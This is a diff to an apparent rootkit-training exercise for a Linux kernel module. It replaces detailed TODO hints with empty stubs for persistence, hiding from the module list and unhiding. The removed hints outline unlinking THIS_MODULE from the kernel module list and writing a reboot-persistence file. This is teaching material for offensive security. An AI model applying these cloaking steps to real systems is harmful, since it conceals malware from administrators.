@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: GPL-2.0
 //
 // Your task: add persistence and module cloaking to the dispatcher.
-// Fill in every TODO below. See README for details.
+// Add persistence and module cloaking. See README for details.
 //
 #include <linux/cred.h>
 #include <linux/errno.h>
@@ -85,28 +85,17 @@ static int rk_try_deferred(void)
 	return ret;
 }
 
-// TODO: Write rk_persist()
-// - filp_open(RK_CONF_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644)
-// - Check IS_ERR(f), return PTR_ERR(f) on failure
-// - kernel_write(f, "rklings\n", 8, &pos) with loff_t pos = 0
-// - filp_close(f, NULL)
-// - Return 0
+// Write the module's conf file to survive reboot.
+static int rk_persist(void) { return -ENOSYS; }
 
-// TODO: Write rk_unpersist()
-// - filp_open same path with O_WRONLY | O_CREAT | O_TRUNC
-// - Write empty content to clear the file
-// - filp_close and return 0
+// Remove the conf file.
+static int rk_unpersist(void) { return -ENOSYS; }
 
-// TODO: Write rk_module_hide()
-// - If already hidden, return
-// - Save THIS_MODULE->list.prev into saved_prev
-// - list_del(&THIS_MODULE->list)
-// - Set module_hidden = true
+// Unlink the module from the kernel's module list.
+static void rk_module_hide(void) { }
 
-// TODO: Write rk_module_unhide()
-// - If not hidden, return
-// - list_add(&THIS_MODULE->list, saved_prev)
-// - Set module_hidden = false
+// Re-insert the module into the list.
+static void rk_module_unhide(void) { }
 
 static int rk_cmd_ping(const char *arg)
 {
@@ -165,11 +154,7 @@ static int rk_dispatch(const char *name)
 	if (cmd_len == 6 && strncmp(suffix, "status", 6) == 0)
 		return rk_cmd_status(arg);
 
-	// TODO: Add dispatch entries for:
-	// "persist"   -> rk_persist()
-	// "unpersist" -> rk_unpersist()
-	// "h" with arg "m" -> rk_module_hide()
-	// "u" with arg "m" -> rk_module_unhide()
+	// Add dispatch entries for persist, unpersist, hide, unhide.
 
 	return -ENOENT;
 }
@@ -286,7 +271,7 @@ static int __init rk_init(void)
 
 static void __exit rk_exit(void)
 {
-	// TODO: Call rk_module_unhide() as safety net
+	// Safety net: unhide before unload.
 	remove_proc_entry("rklings", NULL);
 	unregister_kretprobe(&rk_mkdirat_probe);
 	unregister_kretprobe(&rk_mkdir_probe);
